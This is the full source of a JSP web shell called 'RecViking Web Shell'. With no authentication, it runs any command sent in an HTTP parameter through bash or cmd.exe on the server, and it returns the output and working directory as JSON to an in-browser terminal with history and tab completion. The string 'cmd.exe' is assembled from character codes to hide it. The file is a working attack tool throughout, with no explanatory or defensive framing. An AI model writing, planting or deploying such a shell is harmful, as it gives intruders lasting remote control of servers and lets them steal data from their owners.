<%@ page import="java.util.*,java.io.*"%><%
String c;
String t;
String cwd;

String prewin = String.valueOf((char)(99)) + String.valueOf((char)(109)) + String.valueOf((char)(100)) + String.valueOf((char)(46)) + String.valueOf((char)(101)) + String.valueOf((char)(120)) + String.valueOf((char)(101));
String prelin = "/usr/bin/bash";

String pre = "";
String pwdcmd = "";
String cdcmd = "";
String prec = "";
cwd = (new java.io.File( "." )).toString();

try{
	c = request.getParameter("c");
}catch (Exception e){
	c = "";
}
try{
	t = request.getParameter("t");
}catch (Exception e){
	t = "";
}
try{
	if(request.getParameter("cwd") != ""){
		cwd = (new java.io.File(request.getParameter("cwd"))).toString();
	}else{
		cwd = (new java.io.File( "." )).toString();
	}
}catch (Exception e){
	cwd = (new java.io.File( "." )).toString();
}
String os = System.getProperty("os.name").toLowerCase();
if(os.indexOf("win") >= 0){
	pre = prewin;
	pwdcmd = " & cd";
	prec = "/c";
	cdcmd = " cd \"" + cwd + "\" & ";
}else{
	pre = prelin;
	pwdcmd = " ; pwd ; ";
	prec = "-c";
	cdcmd = " cd \"" + cwd + "\" ; ";
}

if (c != null && c != ""){
	response.setContentType("application/json; charset=utf-8");
	Runtime r = Runtime.getRuntime();
	String[] parms = {pre, prec, c + pwdcmd};
	String stdout = "";
	StringBuffer sbSO = new StringBuffer();
	StringBuffer sbSE = new StringBuffer();
	String str;
	try{
		Process p = r.exec(parms, new String[0], new java.io.File(cwd));
		InputStreamReader isReaderSO = new InputStreamReader(p.getInputStream());
		InputStreamReader isReaderSE = new InputStreamReader(p.getErrorStream());
		BufferedReader readerSO = new BufferedReader(isReaderSO);
		BufferedReader readerSE = new BufferedReader(isReaderSE);
		while((str = readerSO.readLine()) != null){
			sbSO.append(str + "\n");
		}
		while((str = readerSE.readLine()) != null){
			sbSE.append(str + "\n");
		}
	}catch (Exception e){
		sbSE.append(e.toString());
	}
	String tsSO = sbSO.toString().trim();
	if(tsSO.lastIndexOf("\n") > -1){
		tsSO = tsSO.substring(tsSO.lastIndexOf("\n")).trim();
		stdout = sbSO.toString().trim().substring(0,sbSO.toString().trim().lastIndexOf("\n")).replace("\r","");
	}else{
		stdout = " ";
	}
	out.print("{\"c\": \"\",\"stdout\": \"" + stdout.replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r").replace("\t","\\t").replace("\f","\\f").replace("\b","\\b") + "\", \"stderr\": \"" + sbSE.toString().replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r").replace("\t","\\t").replace("\f","\\f").replace("\b","\\b") + "\", \"cwd\": \"" + tsSO.replace("\\", "\\\\") + "\", \"error\": null}");
	return;
}else if(t != null && t != ""){
        response.setContentType("application/json; charset=utf-8");
	
	String[] tabwords = t.split(" ");
	if (t.charAt(t.length() - 1) == ' '){
		String[] tmptabwords = new String[tabwords.length + 1];
		for(int i = 0; i < tabwords.length; i++){
			tmptabwords[i] = tabwords[i];
		}
		tmptabwords[tmptabwords.length - 1] = "";
		tabwords = tmptabwords;
	}
	String c_debug = "";
        String stdout = "";
        StringBuffer sbSO = new StringBuffer();
        StringBuffer sbSE = new StringBuffer();
        String str;
        
	for(int i = tabwords.length - 1; i > -1; i--){
		String tmpt = String.join(" ", Arrays.copyOfRange(tabwords, i, tabwords.length));
		if (pre == prewin){
			c = "dir /B \"" + tmpt + "*\"";
		}else{
			if (tmpt.indexOf("/") > -1 && tmpt.charAt(tmpt.length() - 1) != (char)'/'){
				String path_tmpt = tmpt.substring(0,tmpt.lastIndexOf("/"));
				String safetmpt = tmpt.substring(tmpt.lastIndexOf("/") + 1,tmpt.length()).replace("\\", "\\\\").replace("\"","\\\"").replace(".", "\\.").replace("[", "\\[").replace("(", "\\(");
				c = "ls \"" + path_tmpt + "\" | grep -i -e \"^" + safetmpt + "\";";
			}else{
				if (tmpt.length() > 0 && tmpt.charAt(tmpt.length() - 1) == (char)'/'){
					String safetmpt = tmpt.replace("\\", "\\\\").replace("\"","\\\"").replace("[", "\\[").replace("(", "\\(");
					c = "ls \"" + safetmpt + "\";";
				}else{
					String safetmpt = tmpt.replace("\\", "\\\\").replace("\"","\\\"").replace(".", "\\.").replace("[", "\\[").replace("(", "\\(");
					c = "ls | grep -i -e \"^" + safetmpt + "\";";
				}
			}
		}
		c = cdcmd + c;
		c_debug = c_debug + "\n" + c;
		Runtime r = Runtime.getRuntime();
	        try{
			String[] parms = {pre, prec, c};
        	        Process p = r.exec(parms, new String[0], new java.io.File(cwd));
        	        InputStreamReader isReaderSO = new InputStreamReader(p.getInputStream());
        	        InputStreamReader isReaderSE = new InputStreamReader(p.getErrorStream());
        	        BufferedReader readerSO = new BufferedReader(isReaderSO);
        	        BufferedReader readerSE = new BufferedReader(isReaderSE);
        	        while((str = readerSO.readLine()) != null){
        	                sbSO.append(str + "\n");
        	        }
        	        while((str = readerSE.readLine()) != null){
                	        sbSE.append(str + "\n");
               		}
	        }catch (Exception e){
        	        sbSE.append(e.toString());
        	}

	}
        
	String tsSO = sbSO.toString().trim();
	tsSO = tsSO.replace("\r", "\n").trim();
	while (tsSO.indexOf("\n\n") > -1){
		tsSO.replace("\n\n", "\n");
	}
	tsSO = tsSO.trim();
	String[] strarr = tsSO.split("\n");
	if(strarr.length > 0){
		for(int i = 0; i < strarr.length; i++){
			strarr[i] = "\"" + strarr[i].replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r").replace("\t","\\t").replace("\f","\\f").replace("\b","\\b") + "\"";
		}
		tsSO = "[" + String.join(", ", strarr) + "]";
	}
	if (tsSO.length() > 0){
		sbSE = new StringBuffer();
		stdout = tsSO;
	}else{
        	stdout = "[]";
        }
	c_debug = c_debug.replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r").replace("\t","\\t").replace("\f","\\f").replace("\b","\\b");
        out.print("{\"c\": \"\",\"stdout\": " + stdout + ", \"stderr\": \"" + sbSE.toString().replace("\\","\\\\").replace("\"","\\\"").replace("\n","\\n").replace("\r","\\r").replace("\t","\\t").replace("\f","\\f").replace("\b","\\b") + "\", \"error\": null, \"c_debug\": \"" + c_debug + "\"}");
        return;

}else{ 
	String htmlgui = 
		"<!doctype html><html lang=en>" +
		"<head>" +
		"<meta charset='utf-8'>" +
		"<meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'>" +
		"<title>RecViking Web Shell</title>" +
		"<link rel='stylesheet' href='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css'>" +
		"<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>" +
		"<script src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js'></script>" +
		"<script>localStorage.setItem('cmdHistory', JSON.stringify([])); localStorage.setItem('cmdCurrent', '');localStorage.setItem('cwd', ''); localStorage.setItem('cmdIndex', 0);</script>" +
		"<script>function unscrew(inval){var outval; outval = inval.replace(/\\n/gm,String.fromCharCode(10)).replace(/\\r/gm,String.fromCharCode(13)).replace(/\\t/g,String.fromCharCode(9)).replace(/\\\\/g,String.fromCharCode(92));return outval;}</script>" +
		"<script>function promptCheck() {if (document.getElementById('cmdin').value.charAt(0) != String.fromCharCode(62)){document.getElementById('cmdin').value=String.fromCharCode(62).concat(document.getElementById('cmdin').value);};}</script>" +
		"<script>function runcmd(cmdVal) {var tmparr = JSON.parse(localStorage.cmdHistory); if(tmparr[tmparr.length - 1] != cmdVal){tmparr.push(cmdVal)}; localStorage.cmdHistory = JSON.stringify(tmparr);localStorage.cmdIndex = 0;localStorage.cmdCurrent = cmdVal; $.post(window.location.href, {c: cmdVal, cwd: localStorage.cwd}, function(data){if(data['error'] == null){if(data['stdout']){document.getElementById('cmdout').innerHTML += '<pre>' + unscrew(data['stdout']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';} if(data['stderr']){document.getElementById('cmdout').innerHTML += '<pre style=\"color: red;\">' + unscrew(data['stderr']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';}$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);document.getElementById('cwd').innerHTML = data['cwd'];localStorage.cwd=data['cwd'];}else{document.getElementById('cmdout').innerHTML += '<pre style=\"color: red;\">' + unscrew(data['error']).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}});};</script>" +
		"<script>function tabcomplete() {var cmdtmp = document.getElementById('cmdin').value.substring(1); $.post(window.location.href, {t: cmdtmp, cwd: localStorage.cwd}, function(data){if(data['error'] == null && data['stderr'] == ''){if(data['stdout'].length == 1){var str = document.getElementById('cmdin').value.toLowerCase();var str2 = data['stdout'][0].toLowerCase();var lms = '';for(var i = 1;i <= str2.length;i++){var tmpsec = str2.substring(0,i);if(str.includes(tmpsec, str.length - tmpsec.length)){lms = tmpsec;}}document.getElementById('cmdin').value += data['stdout'][0].substring(lms.length);};document.getElementById('cmdout').innerHTML += \"<pre style='color: gray'>\" + data['stdout'] + \"</pre>\";$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}else{document.getElementById('cmdout').innerHTML += \"<pre style='color: gray'>\" +  'tab completion failed: ' + data['error'] + \"</pre>\";$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);}});}</script>" +
		"<style>" +
		"#mainwin { width: 800px; height: 600px; padding: 0.5em; background-color: black;}" +
		"#mainwin h3 { text-align: center; margin: 0; }" +
		"</style>" +
		"</head>" +
		"<body>" +
		"<div id='mainwin'>" +
		"<h3 class='ui-widget-header'>RecViking Web Shell (<span id='cwd'></span>)</h3>" +
		"<div style='width: 100%; float: left; background-color: black; color: white;'>" +
		"<div id='cmdout' style='float: left; width: 100%; background-color: black; color: white; height: 560px; overflow-y: scroll; overflow-x: hidden'></div>" +
		"<input type='text'id='cmdin' style='float: left; background-color: black; color: white; width: 100%; border: 0px; padding 0px;' onchange='promptCheck()' oninput='promptCheck()' value='>'></input>" +
		"<script>document.getElementById('cmdin').addEventListener('keyup', function(event){if(event.keyCode === 13){var cmdvar=document.getElementById('cmdin').value.substr(1);document.getElementById('cmdout').innerHTML += '<pre>' + document.getElementById('cmdin').value.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</pre>';document.getElementById('cmdin').value='>';$('#cmdout').scrollTop($('#cmdout')[0].scrollHeight);runcmd(cmdvar);}else if(event.keyCode === 38){if(parseInt(localStorage.cmdIndex) == 0){localStorage.cmdCurrent = document.getElementById('cmdin').value.substr(1);}localStorage.cmdIndex = parseInt(localStorage.cmdIndex) + 1;if(parseInt(localStorage.cmdIndex) <= JSON.parse(localStorage.cmdHistory).length){document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];}else{localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;}}else if(event.keyCode === 40){localStorage.cmdIndex = parseInt(localStorage.cmdIndex) - 1;if(parseInt(localStorage.cmdIndex) <= 0){document.getElementById('cmdin').value = '>' + localStorage.cmdCurrent;localStorage.cmdIndex = 0;}else{document.getElementById('cmdin').value = '>' + JSON.parse(localStorage.cmdHistory)[JSON.parse(localStorage.cmdHistory).length - parseInt(localStorage.cmdIndex)];}}});</script>" +
		"<script>document.getElementById('cmdin').addEventListener('keydown', function(event){if(event.keyCode === 9){event.preventDefault(); tabcomplete();}});</script>" +
		"</div>" +
		"</div>" +
		"</body>";
	out.print(htmlgui);
}%>
